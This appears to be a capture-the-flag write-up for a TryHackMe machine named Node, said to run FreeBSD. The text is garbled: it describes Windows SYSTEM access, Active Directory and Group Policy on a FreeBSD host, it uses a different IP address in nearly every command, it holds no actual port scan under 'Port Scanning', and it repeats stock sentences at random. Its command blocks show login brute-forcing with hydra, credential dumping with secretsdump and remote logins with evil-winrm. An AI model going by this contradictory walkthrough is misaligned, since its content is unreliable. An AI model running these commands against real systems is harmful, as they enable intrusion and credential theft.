---
TitleSEO: "TryHackMe — Node (Easy FreeBSD) | ZureFX"
TitlePost: "TryHackMe — Node (Easy FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for TryHackMe Node. Sudo Misconfiguration and NFS No Root Squash to achieve easy compromise on FreeBSD."
Keywords: "active directory, ctf, offsec, forensics, windows, hackthebox"
URL: "https://zurefx.github.io/writeups/htb-node-346.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-node-346/"
Date: "2025-11-25"
Tags: "Active Directory, CTF, OffSec, Forensics, Windows, HackTheBox"
Section: "writeups"
Lang: "en"
main_img: "htb-node-346"
Permalink: "/writeups/htb-node-346.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Node** is rated **Easy** on TryHackMe. It runs **FreeBSD** and the IP address during this analysis was `10.45.47.233`.

### Objectives

Initial enumeration revealed several interesting open ports on the target. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.51.241.43 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.58.32.158
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.65.213.117 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.88.233.135/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The database credentials were hardcoded in the application source code. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Service Enumeration

Privilege escalation was possible due to misconfigured sudo permissions. Group Policy Preferences contained encrypted but recoverable credentials. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Weak file permissions allowed modification of critical system files. The service account had excessive permissions assigned in Active Directory.

### SMB Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
evil-winrm -i 10.67.147.176 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.79.47.42 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.43.51.150/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Lateral movement was facilitated by reusing discovered credentials across services. Post-exploitation enumeration revealed a path to domain administrator privileges. Command injection was possible through unsanitized user input in the search functionality.

## Exploitation

### Vulnerability Identification

Lateral movement was facilitated by reusing discovered credentials across services. The database credentials were hardcoded in the application source code. Privilege escalation was possible due to misconfigured sudo permissions.

Key finding: **NFS No Root Squash**.

The kernel version was outdated and vulnerable to a publicly known exploit. The scheduled task ran with elevated privileges and could be abused for escalation.

### Initial Access

The backup files contained sensitive information that should not have been accessible. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Group Policy Preferences contained encrypted but recoverable credentials. The target system was identified as running a vulnerable version of the service. The service was running without proper input validation, leading to injection vulnerabilities.

## Privilege Escalation

### Enumeration

The target system was identified as running a vulnerable version of the service. Post-exploitation enumeration revealed a path to domain administrator privileges. Token impersonation allowed elevation to SYSTEM privileges on the target.

```powershell
gobuster dir -u http://10.20.198.152/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.56.200.207/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Exploitation

The scheduled task ran with elevated privileges and could be abused for escalation. Initial enumeration revealed several interesting open ports on the target.

```powershell
crackmapexec smb 10.14.230.234 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Command injection was possible through unsanitized user input in the search functionality.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Privilege escalation was possible due to misconfigured sudo permissions. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Summary

### Tools Used

- `feroxbuster`
- `atexec`
- `ffuf`
- `kerbrute`
- `nmap`
- `ligolo-ng`
- `enum4linux`
- `secretsdump`

### Key Takeaways

- Sudo Misconfiguration
- NFS No Root Squash
